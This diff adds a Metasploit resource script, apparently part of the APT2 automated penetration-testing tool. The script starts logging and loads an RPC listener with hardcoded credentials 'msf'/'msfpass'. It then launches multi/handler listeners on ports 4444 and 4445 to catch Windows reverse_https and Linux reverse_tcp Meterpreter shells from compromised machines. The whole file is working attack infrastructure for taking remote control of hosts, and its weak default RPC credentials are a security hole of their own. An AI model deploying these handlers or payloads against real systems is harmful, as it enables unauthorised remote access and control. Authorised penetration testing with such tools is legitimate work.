@@ -1,0 +1,33 @@
+# start spooling of output
+<ruby>
+time = Time.new
+run_single("spool ~/.apt2/logs/"+time.strftime("%Y-%m-%d_%H-%M-%S")+"_msf_spool.log")
+</ruby>
+
+# Setup MSFRPC Listener
+load msgrpc User=msf Pass=msfpass
+
+# Set some GLOBAL values
+setg DisablePayloadHandler True
+setg PAYLOAD windows/meterpreter/reverse_https
+setg LHOST 0.0.0.0
+setg LPORT 4444
+setg PromptTimeFormat %d-%b-%y %T
+setg prompt [%T] %L (s:%S j:%J)
+setg ConsoleLogging true
+setg LogLevel 5
+setg SessionLogging true
+setg TimestampOutput true
+
+# setup a default windows multihandler on port 4444 (assume most targets will be windows)
+use exploit/multi/handler
+set ExitOnSession false
+set PAYLOAD windows/meterpreter/reverse_https
+exploit -j -z
+
+# setup a default linux/unix multihandler on port 4445
+use exploit/multi/handler
+set ExitOnSession false
+set PAYLOAD payload/linux/x86/meterpreter/reverse_tcp
+set LPORT 4445
+exploit -j -z
